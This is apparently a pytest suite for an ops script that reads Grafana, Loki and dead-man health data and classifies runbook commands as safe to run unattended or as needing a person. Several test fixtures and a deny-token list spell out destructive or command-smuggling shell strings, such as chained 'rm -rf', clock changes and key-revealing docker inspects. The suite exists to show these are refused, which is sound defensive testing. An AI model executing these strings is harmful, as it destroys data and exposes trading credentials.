"""TDD for `infra/scripts/ops_daily.py` — the daily pass's instrument.

A standalone script, not a package module, so it loads via `spec_from_file_location`; every fixture
here is shaped to what the live Grafana API returns, never to what the parser expects."""

from __future__ import annotations

import contextlib
import dataclasses
import http.client
import importlib.util
import inspect
import io
import json
import re
import string
import subprocess
import sys
import urllib.error
import urllib.parse
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

import pytest
import yaml

_SCRIPT = Path(__file__).resolve().parents[1] / "infra" / "scripts" / "ops_daily.py"
_spec = importlib.util.spec_from_file_location("ops_daily", _SCRIPT)
ops_daily = importlib.util.module_from_spec(_spec)
sys.modules["ops_daily"] = ops_daily
_spec.loader.exec_module(ops_daily)

NOW = datetime(2026, 8, 29, 12, 0, tzinfo=timezone.utc)
DAY = timedelta(hours=24)


def _canned(*payloads):
    """An opener answering each request in turn, then repeating the last."""
    queue = list(payloads)

    @contextlib.contextmanager
    def opener(request, timeout=None):
        payload = queue.pop(0) if len(queue) > 1 else queue[0]
        yield io.BytesIO(json.dumps(payload).encode())

    return opener


def _recording(*payloads):
    """`_canned`, but it keeps the URLs it was asked for, so a test can assert the endpoint built."""
    urls: list[str] = []
    queue = list(payloads)

    @contextlib.contextmanager
    def opener(request, timeout=None):
        urls.append(request.full_url if hasattr(request, "full_url") else str(request))
        payload = queue.pop(0) if len(queue) > 1 else queue[0]
        yield io.BytesIO(json.dumps(payload).encode())

    opener.urls = urls
    return opener


def _raises(exc):
    @contextlib.contextmanager
    def opener(request, timeout=None):
        raise exc
        yield  # pragma: no cover

    return opener


def _rules(*rules):
    return {"data": {"groups": [{"name": "zcrypto-capture", "rules": list(rules)}]}}


_EMPTY_HISTORY = {"data": {"values": []}}


def test_the_rules_read_pairs_every_firing_instance_with_its_runbook_link():
    payload = _rules(
        {
            "name": "Capture · stream silent",
            "uid": "zcrypto-capture-stream-silent",
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "one stream stopped. Runbook: infra/runbooks/capture.md#zcrypto-capture-stream-silent"},
            "alerts": [
                {"state": "Alerting", "activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "zcrypto", "system": "maintenance"}},
                {
                    "state": "Alerting",
                    "activeAt": "2026-08-29T10:02:00Z",
                    "labels": {"host": "zcrypto-red", "system": "maintenance"},
                },
                {"state": "Alerting", "activeAt": "2026-08-29T10:04:00Z", "labels": {"host": "zcrypto-red", "system": "post_only"}},
            ],
        },
        {
            "name": "Capture · venue not online",
            "uid": "zcrypto-capture-venue-not-online",
            "state": "inactive",
            "labels": {"severity": "warning"},
            "annotations": {},
            "alerts": [],
        },
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert [a.uid for a in read.firing_now] == ["zcrypto-capture-stream-silent"]
    assert read.firing_now[0].runbook == "infra/runbooks/capture.md#zcrypto-capture-stream-silent"
    assert read.unreadable is None
    # One Alert per RULE carrying every host with a firing instance, deduped: the venue rules group
    # `by (host, system)`, and the silence the runbook prescribes is created and deleted PER HOST, so
    # a reader who cannot enumerate the hosts cannot discharge that obligation.
    assert read.firing_now[0].hosts == ("zcrypto", "zcrypto-red")
    assert read.firing_now[0].active_at == "2026-08-29T10:00:00Z"


def test_the_rules_read_lists_every_rule_whose_health_is_not_ok():
    """A rule Grafana could not evaluate pages nothing -- `execErrState: OK` makes that deliberate --
    so the daily pass lists every rule whose `health` is set and not `ok`, with the error Grafana
    attached; a rule carrying no `health` field and no `(Error)` instance is not a finding."""
    payload = _rules(
        {
            "name": "Capture · all streams silent",
            "uid": "zcrypto-capture-all-streams-silent",
            "state": "inactive",
            "health": "error",
            "lastError": "parse error at char 12: unexpected identifier",
            "annotations": {},
            "alerts": [],
        },
        {
            "name": "Capture · stream silent",
            "uid": "zcrypto-capture-stream-silent",
            "state": "inactive",
            "health": "ok",
            "annotations": {},
            "alerts": [],
        },
        {"name": "Ops · no health field", "uid": "zcrypto-ops-shape", "state": "inactive", "annotations": {}, "alerts": []},
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.unhealthy == [
        ops_daily.RuleHealth(
            "zcrypto-capture-all-streams-silent",
            "Capture · all streams silent",
            "error",
            "parse error at char 12: unexpected identifier",
        )
    ]
    assert read.unreadable is None


def test_a_rule_set_that_is_all_ok_lists_nothing_unhealthy():
    payload = _rules(
        {"name": "a", "uid": "zcrypto-a", "state": "inactive", "health": "ok", "annotations": {}, "alerts": []},
        {"name": "b", "uid": "zcrypto-b", "state": "firing", "health": "ok", "annotations": {}, "alerts": [{"state": "Alerting"}]},
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.unhealthy == []


def test_the_rules_read_lists_a_rule_whose_instances_carry_the_error_reason_while_its_health_reads_ok():
    """An `(Error)` reason on an instance is unhealthy even where the rule's own `health` reads `ok`:
    by ngalert's source that suffix is all `execErrState: OK` leaves of a failed evaluation (T0167's
    read-back saw the shape live, not the mapping). A NoData or MissingSeries reason is not one."""
    payload = _rules(
        {
            "name": "Capture · all streams silent",
            "uid": "zcrypto-capture-all-streams-silent",
            "state": "inactive",
            "health": "ok",
            "annotations": {},
            "alerts": [{"state": "Normal (Error)", "labels": {"host": "zcrypto"}}],
        },
        {
            "name": "Ops · compound reason",
            "uid": "zcrypto-ops-compound",
            "state": "firing",
            "health": "ok",
            "annotations": {},
            "alerts": [{"state": "Alerting (Error, KeepLast)"}],
        },
        {
            "name": "Engine · cycle stale",
            "uid": "zcrypto-engine-cycle-stale",
            "state": "firing",
            "health": "ok",
            "annotations": {},
            "alerts": [{"state": "Normal (NoData)"}, {"state": "Alerting (NoData)"}, {"state": "Normal (MissingSeries)"}],
        },
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert [(r.uid, r.health, r.last_error) for r in read.unhealthy] == [
        ("zcrypto-capture-all-streams-silent", "Normal (Error)", ""),
        ("zcrypto-ops-compound", "Alerting (Error, KeepLast)", ""),
    ]


def test_an_unhealthy_rule_is_attention_and_named_in_the_report():
    """A rule that has stopped evaluating is not an all-clear, whatever else the pass saw."""
    sick = ops_daily.RuleHealth("zcrypto-capture-all-streams-silent", "Capture · all streams silent", "error", "parse error")
    report = _report(alerts=ops_daily.AlertsRead(unhealthy=[sick]))
    assert report.exit_code == 1
    md = report.markdown()
    assert "## Rules not evaluating" in md
    assert "`zcrypto-capture-all-streams-silent`" in md and "parse error" in md
    assert "1 rule not evaluating" in report.journal_paragraph()


def test_a_rule_without_a_uid_is_a_finding_never_a_silently_dropped_rule():
    """The uid is how a fired alert reaches its runbook; a shape change that drops it must not read
    as a quiet fleet."""
    payload = _rules({"name": "no uid here", "state": "firing", "labels": {}, "annotations": {}, "alerts": []})
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload))
    assert read.firing_now == []
    assert read.unreadable and "uid" in read.unreadable


def test_a_history_chunk_at_the_page_limit_is_a_finding_not_a_silent_truncation():
    """A chunk returning AT the limit may have dropped transitions, and a report that shows the
    survivors reads as a quiet day."""
    at_limit = {"data": {"values": [["x"] * ops_daily.HISTORY_PAGE_LIMIT]}}
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(_rules(), at_limit))
    assert read.unreadable and "page limit" in read.unreadable


def test_an_unreachable_grafana_is_reported_never_read_as_nothing_firing():
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_raises(urllib.error.URLError("down")))
    assert read.firing_now == [] and read.fired_in_window == []
    assert read.unreadable and "down" in read.unreadable


@pytest.mark.parametrize(
    "uid,expected",
    [
        ("zcrypto-alloy-dark-ops", "ops"),
        ("zcrypto-alloy-dark-nas", "nas"),
        ("zcrypto-alloy-dark-capture-primary", "zcrypto"),
        ("zcrypto-alloy-dark-capture-secondary", "zcrypto-red"),
    ],
)
def test_the_host_is_recovered_from_the_uid_when_the_rule_aggregates_it_away(uid, expected):
    """These rules' expr aggregates the host away -- `count(up{host="ops"}) or on() vector(0)` leaves
    the firing instance carrying only `severity` -- so without `_UID_HOST` the pass cannot tell an
    Alloy restart that is routine on ops from the same restart on the attended capture pair."""
    payload = _rules(
        {
            "name": "Alloy dark",
            "uid": uid,
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {},
            "alerts": [{"state": "Alerting", "activeAt": "2026-08-29T10:00:00Z", "labels": {"severity": "critical"}}],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].hosts == (expected,)


def test_an_instance_host_label_wins_over_the_uid_map():
    payload = _rules(
        {
            "name": "Alloy dark",
            "uid": "zcrypto-alloy-dark-ops",
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {},
            "alerts": [{"state": "Alerting", "activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "nas"}}],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].hosts == ("nas",)


# --- Task 12 (spec 00104): the log plane -------------------------------------------------------------------


def test_the_loki_uid_defaults_to_the_named_datasource_and_is_overridable():
    """A lookup BY TYPE is the T0034 defect: a Cloud stack ships several Loki datasources, and
    'the first of each type' silently repointed every rule once."""
    assert ops_daily.loki_ds_uid({}) == "grafanacloud-logs"
    assert ops_daily.loki_ds_uid({"GRAFANA_LOKI_DS_UID": "other-loki"}) == "other-loki"


def test_the_log_counts_come_back_by_host_container_and_level():
    payload = {
        "data": {
            "result": [
                {"metric": {"host": "zcrypto", "container": "capture", "level": "ERROR"}, "value": [1, "3"]},
                {"metric": {"host": "ops", "container": "alloy", "level": "WARNING"}, "value": [1, "11"]},
            ]
        }
    }
    read = ops_daily.read_logs("tok", window=DAY, opener=_canned(payload))
    assert (read.counts[0].host, read.counts[0].level, read.counts[0].count) == ("ops", "WARNING", 11)
    assert read.unreadable is None


def test_an_unreachable_loki_is_reported_never_read_as_no_errors():
    read = ops_daily.read_logs("tok", window=DAY, opener=_raises(urllib.error.HTTPError("u", 502, "bad gateway", {}, None)))
    assert read.counts == [] and read.unreadable and "502" in read.unreadable


# --- Task 13 (spec 00104): the dead-men, the fleet verdict, the window's deploys ----------------------------


def test_the_deadmen_are_read_both_through_grafana_and_directly(monkeypatch):
    """The direct read is the domain's whole point: it must answer while Grafana is dark."""
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "hcr_fake")
    prom = {"data": {"result": [{"metric": {}, "value": [1, "0"]}]}}
    direct = {"checks": [{"name": "zcrypto-engine-shadow", "status": "up"}]}
    read = ops_daily.read_deadmen("tok", opener=_canned(prom, direct))
    assert read.via_prometheus == 0.0
    assert [c["name"] for c in read.via_healthchecks] == ["zcrypto-engine-shadow"]
    assert read.unreadable is None


def test_a_missing_readonly_key_is_named_never_silently_skipped(monkeypatch):
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: None)
    read = ops_daily.read_deadmen("tok", opener=_canned({"data": {"result": []}}))
    assert read.unreadable and "healthchecks_readonly_api_key" in read.unreadable


def test_no_series_is_a_verdict_failure_never_a_pass():
    """`ops-postverify.sh`'s rule, carried into the fleet checks: an empty query is not a zero."""
    checks = ops_daily.read_verdict("tok", opener=_canned({"data": {"result": []}}))
    assert checks and all(not c.ok for c in checks)
    assert all(c.value == "(no series)" for c in checks)


@pytest.mark.parametrize(("value", "ok"), [("1", True), ("0", False)])
def test_a_value_bearing_check_is_judged_on_its_VALUE_never_on_the_series_existing(value, ok):
    """A value-bearing check is judged on its VALUE: `up` is 0, not absent, when Alloy runs and the
    app it scrapes is dead, so a presence-only check would print PASS beside the one value this
    check exists to catch."""
    payload = {"data": {"result": [{"metric": {}, "value": [1, value]}]}}
    up = next(c for c in ops_daily.read_verdict("tok", opener=_canned(payload)) if c.name == "capture primary up")
    assert up.ok is ok
    assert up.value == value


def test_an_out_of_bound_age_fails_rather_than_reporting_its_number_as_a_pass():
    """A check whose name does not end `present` carries the bound of the rule that owns it, so the
    pass cannot print PASS beside a value the fleet is already paging on."""
    payload = {"data": {"result": [{"metric": {}, "value": [1, "99999"]}]}}
    age = next(c for c in ops_daily.read_verdict("tok", opener=_canned(payload)) if c.name == "engine cycle age")
    assert not age.ok
    assert age.value == "99999"


def test_the_deploy_window_holds_only_lines_inside_it(tmp_path):
    log = tmp_path / "deploy-log.jsonl"
    log.write_text(
        '{"ts": "2026-08-29T11:00:00Z", "playbook": "site.yml", "limit": "ops"}\n'
        '{"ts": "2026-08-20T11:00:00Z", "playbook": "site.yml", "limit": "nas"}\n'
        "\n"
        "not json\n"
    )
    lines = ops_daily.read_deploys(DAY, now=NOW, path=log)
    assert [d["limit"] for d in lines] == ["ops"]


# --- Task 14 (spec 00104): the report, the exit codes -------------------------------------------------------


def _report(**kw):
    base = dict(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(via_prometheus=0.0, via_healthchecks=[{"name": "x"}]),
        verdict=[ops_daily.Check("capture primary up", "up{...}", ok=True, value="1")],
        deploys=[],
        reminders=ops_daily.RemindersRead(),
        now=NOW,
    )
    return ops_daily.build_report(**{**base, **kw})


def test_an_all_clear_report_exits_zero():
    r = _report()
    assert r.exit_code == 0 and r.verdict_word == "all-clear"


def test_anything_fired_exits_one():
    firing = ops_daily.AlertsRead(firing_now=[ops_daily.Alert("u", "t", "firing", None, None, ("ops",))])
    assert _report(alerts=firing).exit_code == 1


def test_a_failed_fleet_check_exits_one():
    failed = [ops_daily.Check("capture primary up", "up{...}", ok=False, value="(no series)")]
    assert _report(verdict=failed).exit_code == 1


def test_a_source_the_instrument_could_not_read_exits_two_and_names_it():
    """A source it cannot reach is a finding ABOUT that source, never a silent gap."""
    r = _report(alerts=ops_daily.AlertsRead(unreadable="rules API 502"))
    assert r.exit_code == 2 and "rules API 502" in r.markdown()


def test_unreadable_outranks_fired_so_a_partial_read_is_never_reported_as_attention_only():
    firing = ops_daily.AlertsRead(
        firing_now=[ops_daily.Alert("u", "t", "firing", None, None, ("ops",))], unreadable="history truncated"
    )
    assert _report(alerts=firing).exit_code == 2


def test_the_journal_paragraph_carries_every_labelled_clause():
    para = _report().journal_paragraph()
    for clause in ("window", "alerts", "checks", "logs", "dead-men", "deploys", "reminders", "actions", "follow-ups"):
        assert clause in para, f"missing clause: {clause}"


def test_the_cli_refuses_an_unknown_subcommand():
    assert ops_daily.main([]) == 2
    assert ops_daily.main(["frobnicate"]) == 2


# --- Task 15b (spec 00104): the tier classifier -------------------------------------------------------------

# infra/runbooks/observability.md, the alloy-dark section -- one body serving nas, ops AND both
# capture hosts, which is why the host is an argument and not read out of the step.
_ALLOY_RESTART = "Restart it — safe, and the usual fix: `sudo docker restart grafana-alloy`."


@pytest.mark.parametrize(
    "host,expected",
    [
        ("ops", ops_daily.Tier.AUTONOMOUS),
        ("nas", ops_daily.Tier.AUTONOMOUS),
        ("zcrypto", ops_daily.Tier.PREPARED),
        ("zcrypto-red", ops_daily.Tier.PREPARED),
        (None, ops_daily.Tier.PREPARED),
    ],
)
def test_the_same_step_is_routine_on_ops_and_attended_on_the_capture_pair(host, expected):
    """Identical text; only the host differs. A classifier reading the text alone must get one of
    these wrong, and the wrong one restarts Alloy on the capture primary unattended."""
    assert ops_daily.classify_action(_ALLOY_RESTART, host=host) is expected


@pytest.mark.parametrize(
    "text",
    [
        'Read the ladder: `sudo docker logs zcrypto-capture 2>&1 | grep -E "checksum desync"`.',
        "`uv run python infra/scripts/grafana-query.py 'zcrypto_capture_book_desynced'`",
        "**Engine-side**: `sudo docker inspect --format '{{.State.Status}} {{.RestartCount}}' zcrypto-engine`",
        "**Prove the prune ring is alive**: `systemctl list-timers 'zcrypto-*'` and `journalctl -u zcrypto-capture-prune -n 3 --no-pager`",
        "Read the engine's gate: `sudo docker exec zcrypto-engine zcrypto engine exec-status`.",
        "`sudo docker logs zcrypto-capture --since 1h 2>&1 | tail -50`",
        "`df -h /` then `sudo du -xsh /var/lib/zcrypto-capture/* | sort -h`",
    ],
)
def test_a_read_only_step_is_autonomous_even_naming_a_protected_object(text):
    """A read-only step is AUTONOMOUS even when it names a protected object: a classifier keyed on
    the two commonest read verbs would prepare every other logs, grep and journalctl step."""
    assert ops_daily.classify_action(text, host="zcrypto") is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "text",
    [
        "On the named host: `sudo systemctl restart zcrypto-capture`.",
        "Stop the daemon, then read its logs: `sudo systemctl stop zcrypto-capture`.",
        "Restart the engine: `sudo systemctl restart zcrypto-engine`.",
        "Clear the kill file: `sudo rm /var/lib/zcrypto-engine/exec/kill`.",
        "Push the rules: `bash infra/scripts/grafana-push.sh`.",
        "Converge: `infra/ansible/scripts/converge.sh site.yml --limit zcrypto-red`.",
        "**The systemd journal**: `sudo journalctl --vacuum-size=200M`.",
        "`sudo docker exec zcrypto-engine zcrypto engine cycle --at 2026-08-29T12:00:00+00:00 --replace`",
        # ONE span, so the docker-exec payload is what decides: a two-span fixture would fail on the
        # `ssh nas` span instead and pass for the wrong reason.
        "`sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
        "`ssh nas`, then `sudo /usr/local/bin/docker exec zcrypto-archive-pull rm /tmp/gate-cache.json`",
        "`sudo docker inspect zcrypto-engine`",
    ],
)
def test_a_mutating_or_unscoped_step_is_prepared_on_any_host(text):
    """The dangerous half, pinned by name. The last case is an UNSCOPED inspect: it prints the
    container's environment, which on the engine host is the live trade key."""
    assert ops_daily.classify_action(text, host="ops") is ops_daily.Tier.PREPARED


def test_a_bare_command_with_no_backticks_is_judged_as_one_command():
    """The skill passes the command bare, so a text carrying no backtick span is judged as one
    command rather than refused for want of a span."""
    assert ops_daily.classify_action("sudo docker logs zcrypto-capture --since 1h", host="zcrypto") is ops_daily.Tier.AUTONOMOUS


def test_an_unrecognised_action_is_prepared_never_autonomous():
    assert ops_daily.classify_action("Frobnicate the widget.", host="ops") is ops_daily.Tier.PREPARED


_RUNBOOKS = Path(__file__).resolve().parents[1] / "infra/runbooks"
_DESTRUCTIVE = (
    "--replace",
    "--vacuum",
    "--apply",
    "--prune",
    "--force",
    " rm ",
    "systemctl stop",
    "systemctl restart",
    "docker restart",
    "docker stop",
    "docker rm",
    "converge.sh",
    # Closes every position and sells every non-EUR balance at market; never a read-only diagnostic.
    "zcrypto-flatten",
    # Destructive OR banned: a command CLAUDE.md forbids (an unscoped inspect, `docker exec … env`,
    # `docker compose config` -- each prints the container environment, and on the engine host that
    # is the live trade key) is not a read-only diagnostic either; counting it as one would make the
    # floor below measure something other than what it claims.
    "compose down",
    "compose up",
    "compose restart",
    "compose config",
    "docker run",
    "system prune",
    "image prune",
    "exec … env",
    # `{{json .Config}}` exactly -- NOT a prefix: `{{json .Config.Entrypoint}}` is on CLAUDE.md's
    # allowed list, and a prefix token would call a correct classification an offender.
    "{{json .Config}}",
    ".Config.Env",
)


def _runbook_commands() -> list[str]:
    """Every backtick span AND every fenced-block line that parses as a command -- engine.md's
    `cycle --at … --replace` lives in a fenced block, invisible to a backtick-only sweep."""
    out, starters = (
        [],
        (
            "sudo ",
            "ssh ",
            "uv run ",
            "bash ",
            "docker ",
            "systemctl ",
            "journalctl ",
            "df ",
            "du ",
            "find ",
            "cat ",
            "grep ",
            "ls ",
            "curl ",
            "stat ",
        ),
    )
    for path in sorted(_RUNBOOKS.glob("*.md")):
        text = path.read_text()
        out += [s.strip() for s in re.findall(r"`([^`\n]+)`", text)]
        fenced, lines = False, text.splitlines()
        for line in lines:
            if line.strip().startswith("```"):
                fenced = not fenced
                continue
            if fenced or line.startswith("    "):
                out.append(line.strip())
    return [c for c in {c for c in out if c} if c.startswith(starters)]


def test_no_runbook_command_carrying_a_destructive_token_is_ever_autonomous():
    """The guard against the verb nobody imagined: it does not matter WHICH allowlist entry lets a
    runbook command through, only that no command carrying a destructive token does."""
    offenders = [
        c
        for c in _runbook_commands()
        if any(tok in c for tok in _DESTRUCTIVE)
        and ops_daily.classify_action(f"`{c}`", host="zcrypto") is ops_daily.Tier.AUTONOMOUS
    ]
    assert not offenders, f"destructive commands classified autonomous: {offenders}"


def test_most_read_only_diagnostics_are_autonomous_on_ops():
    """The opposite failure: an allowlist so narrow the pass refuses its own diagnostics has moved
    halt-at-step-1 rather than fixed it. Close a red here by WIDENING the allowlist with
    corpus-justified read heads, never by narrowing the extraction -- that games a safety floor by
    shrinking its denominator."""
    reads = [c for c in _runbook_commands() if not any(tok in c for tok in _DESTRUCTIVE)]
    autonomous = [c for c in reads if ops_daily.classify_action(f"`{c}`", host="ops") is ops_daily.Tier.AUTONOMOUS]
    assert len(autonomous) / len(reads) >= 0.70, (
        f"only {len(autonomous)}/{len(reads)} read-only diagnostics classify autonomous; "
        f"refused sample: {sorted(c for c in reads if c not in autonomous)[:12]}"
    )


def test_the_red_button_is_never_autonomous():
    """The unattended daily pass reads these runbooks and classifies every command in them. This
    one closes the whole book at market; nothing may ever run it without a person."""
    for command in ("sudo zcrypto-flatten", "sudo zcrypto-flatten --execute"):
        assert ops_daily.classify_action(f"`{command}`", host="zcrypto") is not ops_daily.Tier.AUTONOMOUS


# Every wrapping of the red button an operator or a runbook would really produce, each paired with a
# read command wearing the SAME wrapper: without the read half, a classifier that refuses everything
# -- or a typo in the button's spelling -- passes every row.
_RED_BUTTON_WRAPPINGS = (
    ("sudo zcrypto-flatten", "sudo docker logs zcrypto-engine --since 1h"),
    ("sudo zcrypto-flatten --execute", "sudo docker logs zcrypto-engine --since 1h"),
    ("sudo /usr/local/sbin/zcrypto-flatten --execute", "sudo docker logs zcrypto-engine --since 1h"),
    (
        "sudo docker exec zcrypto-engine zcrypto engine flatten --state-dir /var/lib/zcrypto-engine --execute",
        "sudo docker exec zcrypto-engine zcrypto engine exec-status",
    ),
    ("ssh zcrypto sudo zcrypto-flatten --execute", "ssh zcrypto sudo docker logs zcrypto-engine --since 1h"),
    ("zcrypto engine flatten --state-dir /var/lib/zcrypto-engine", "zcrypto engine exec-status"),
)


@pytest.mark.parametrize(("button", "read"), _RED_BUTTON_WRAPPINGS)
def test_no_wrapping_of_the_red_button_reaches_autonomous(button, read):
    """The button is refused through every wrapper `_RED_BUTTON_WRAPPINGS` spells it with, and the
    read wearing the same wrapper stays AUTONOMOUS."""
    assert ops_daily.classify_action(f"`{button}`", host="zcrypto") is ops_daily.Tier.PREPARED
    assert ops_daily.classify_action(f"`{read}`", host="zcrypto") is ops_daily.Tier.AUTONOMOUS


def test_the_classify_subcommand_is_what_the_skill_calls(capsys):
    """The skill branches on this exit code -- an incantation nobody runs is how a procedure's first
    instruction silently rots."""
    assert ops_daily.main(["classify", "--host", "ops", _ALLOY_RESTART]) == 0
    assert capsys.readouterr().out.strip() == "autonomous"
    assert ops_daily.main(["classify", "--host", "zcrypto", _ALLOY_RESTART]) == 3
    assert capsys.readouterr().out.strip() == "prepared"


def test_classify_without_a_host_prepares():
    """Not knowing where an action lands is not permission to run it."""
    assert ops_daily.main(["classify", _ALLOY_RESTART]) == 3


def test_the_cli_names_both_subcommands_when_misused(capsys):
    assert ops_daily.main(["frobnicate"]) == 2
    assert "classify" in capsys.readouterr().out


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/foo ; rm -rf /var/lib/zcrypto-engine/store",
        "docker logs zcrypto-capture; sudo systemctl restart zcrypto-capture",
        "docker logs zcrypto-capture & rm -rf /var/lib/zcrypto-capture",
        "echo $(sudo systemctl restart zcrypto-engine)",
        "echo 1 > /var/lib/zcrypto-engine/exec/armed",
        "echo 1 > /var/lib/zcrypto-engine/exec/kill",
        "curl -X DELETE https://healthchecks.io/api/v3/checks/abc",
        "curl -X POST https://example.invalid/api/annotations -d '{}'",
        "curl https://hc-ping.com/some-uuid",
        "docker inspect --format '{{json .Config}}' zcrypto-engine",
        "docker inspect --format '{{.Config.Env}}' zcrypto-engine",
        "docker inspect zcrypto-engine",
    ],
)
def test_shell_composition_and_write_shaped_reads_are_never_autonomous(cmd):
    """Shell composition and write-shaped reads are PREPARED: a redirect into `exec/armed` arms the
    live venue executor, a GET to a ping URL marks a dead-man alive, and `{{json .Config}}` prints
    the engine's Kraken trade key -- no runbook contains such a command, so they are pinned here by
    construction rather than by the corpus."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd",
    [
        # Operator SPELLINGS: `shlex(punctuation_chars=True)` emits each run of `();<>|&` as ONE
        # token -- `|&` runs the second command, and all three `&>` forms redirect.
        "echo pwned |& rm -rf /tmp/probe_target",
        "echo x |& rm -rf /var/lib/zcrypto-capture",
        "echo x |& sudo systemctl restart zcrypto-engine",
        "echo pwned >& /tmp/probe_redir_both",
        "echo pwned &> /tmp/probe_amp_redir",
        "echo pwned &>> /tmp/probe_amp_append",
        "cat /etc/hostname ;; rm -rf /tmp/x",
        # Writes through an OPERAND, not a verb -- `sort -o FILE`, and uniq's second positional is
        # its output file -- so no list of flags can catch a filename that is one by position.
        "sort -o /tmp/probe_sort_out /etc/hostname",
        "uniq /etc/hostname /tmp/probe_uniq_out",
        "cat /etc/hostname | tee /tmp/probe_tee",
        # journalctl's maintenance writes, beside the `--vacuum-size` that was an earlier Critical.
        "journalctl --update-catalog",
        "journalctl --sync",
        "journalctl --relinquish-var",
        # `date -s` sets the system clock, and the runbooks sudo.
        "date -s '2020-01-01 00:00:00'",
        "date --set=2020-01-01",
    ],
)
def test_the_round_three_escapes_are_refused(cmd):
    """Each string mutates in real bash and is refused on every host -- kept as fixtures because a
    guard is unproven until the defect it names is seen to trip it."""
    for host in ("zcrypto", "ops", "nas"):
        assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("sudo /usr/local/bin/docker logs --since 3h zcrypto-archive-pull | tail -50", "nas"),
        ("sudo docker inspect grafana-alloy --format '{{.State.Status}} {{.RestartCount}} {{.State.OOMKilled}}'", "ops"),
        ("sudo docker exec zcrypto-engine zcrypto engine exec-status", "zcrypto"),
        ("uv run python infra/scripts/grafana-query.py 'up{job=\"capture_app\"}'", "ops"),
        ("sudo docker logs --since 5h zcrypto-engine | grep 'not scored'", "zcrypto"),
    ],
)
def test_the_wrappers_and_quoting_the_runbooks_really_use(cmd, host):
    """The runbooks' own spellings stay AUTONOMOUS: the NAS's absolute `/usr/local/bin/docker`, a
    `--format` body or grep pattern holding spaces (so a stage must be tokenised quote-aware),
    `docker exec` fronting a genuine read, and PromQL full of braces and quotes."""
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


def test_a_peeled_docker_exec_payload_is_re_examined_never_trusted():
    """`docker exec` is peeled so its payload can be judged -- the peel must not BE the judgement.

    Same container, same wrapper, opposite verdicts: only the payload separates them."""
    assert (
        ops_daily.classify_action("sudo docker exec zcrypto-engine zcrypto engine exec-status", host="zcrypto")
        is ops_daily.Tier.AUTONOMOUS
    )
    assert (
        ops_daily.classify_action("sudo docker exec zcrypto-archive-pull rm -f /tmp/gate-cache.json", host="nas")
        is ops_daily.Tier.PREPARED
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo docker logs grafana-alloy --since 1h 2>&1 | grep -iE 'collector|error'",
        "sudo docker logs zcrypto-capture 2>&1 | grep -E 'checksum desync|desync recovery'",
        "sudo docker inspect --format '{{.State.Status}} {{.RestartCount}}' zcrypto-engine",
        "curl -fsS http://127.0.0.1:12345/metrics",
    ],
)
def test_the_true_positives_still_pass(cmd):
    """The other half of the bargain: a guard that refuses everything is not a guard, it is an
    outage. A quoted pipe is data, not composition."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.AUTONOMOUS


def test_an_alert_that_fired_and_resolved_overnight_reaches_the_report():
    """An alert that fired and cleared overnight is invisible to `firing_now`, so it must reach the
    report, the exit code and the journal through `fired_in_window` -- or a day whose only event
    self-resolved reads all-clear."""
    rules = _rules(
        {
            "name": "Capture · stream silent",
            "uid": "zcrypto-capture-stream-silent",
            "state": "inactive",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/capture.md#zcrypto-capture-stream-silent"},
            "alerts": [],
        }
    )
    history = {
        "schema": {"fields": [{"name": "time"}, {"name": "line"}, {"name": "labels"}]},
        "data": {
            "values": [
                [1787987260000, 1787990860000],
                [
                    {
                        "previous": "Pending",
                        "current": "Alerting",
                        "ruleUID": "zcrypto-capture-stream-silent",
                        "ruleTitle": "Capture · stream silent",
                    },
                    {
                        "previous": "Alerting",
                        "current": "Normal",
                        "ruleUID": "zcrypto-capture-stream-silent",
                        "ruleTitle": "Capture · stream silent",
                    },
                ],
                [{}, {}],
            ]
        },
    }
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(rules, history))
    assert read.firing_now == [], "it is not firing now -- that is the point"
    assert [a.uid for a in read.fired_in_window] == ["zcrypto-capture-stream-silent"]
    assert read.fired_in_window[0].runbook == "infra/runbooks/capture.md#zcrypto-capture-stream-silent"
    # Reading it is half the job; the pass's artefacts are the report and the journal paragraph, and
    # a `read_alerts` assertion alone cannot tell a rendered list from a discarded one.
    report = _report(alerts=read)
    assert "zcrypto-capture-stream-silent" in report.markdown()
    assert "infra/runbooks/capture.md#zcrypto-capture-stream-silent" in report.markdown()
    assert report.exit_code == 1 and report.verdict_word == "attention"
    assert "zcrypto-capture-stream-silent" in report.journal_paragraph()


def test_a_normal_instance_does_not_contribute_its_host_to_a_firing_rule():
